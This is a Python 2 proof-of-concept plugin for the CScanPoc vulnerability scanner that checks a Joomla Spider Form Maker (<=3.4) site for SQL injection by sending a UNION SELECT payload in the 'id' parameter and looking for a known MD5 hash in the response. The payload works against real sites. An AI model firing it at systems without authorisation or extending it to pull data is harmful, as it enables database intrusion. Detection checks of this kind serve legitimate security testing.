# coding: utf-8
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Joomla_0111'  # 平台漏洞编号，留空
    name = 'Joomla Spider Form Maker <=3.4 SQL注入'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-10-24'  # 漏洞公布时间
    desc = '''
    Joomla Spider Form Maker <=3.4 SQL注入漏洞:
    Joomla 3.4 /index.php 文件"id" 变量没有进行过滤。
    '''  # 漏洞描述
    ref = 'http://www.exploit-db.com/exploits/34637/',  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Joomla!'  # 漏洞应用名称
    product_version = '<=3.4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5332b9b2-7b7b-479e-b4c6-a750797bd46d'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ("/index.php?option=com_formmaker&view=formmaker&id=1%20UNION%20ALL%20SELECT%20NULL,"
                       "NULL,NULL,NULL,NULL,CONCAT(0x7165696a71,IFNULL(CAST(md5(3.1415)%20AS%20CHAR),0x20),"
                       "0x7175647871),NULL,NULL,NULL,NULL,NULL,NULL,NULL%23")
            verify_url = self.target + payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            if "63e1f04640e83605c1d177544a5a0488" in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
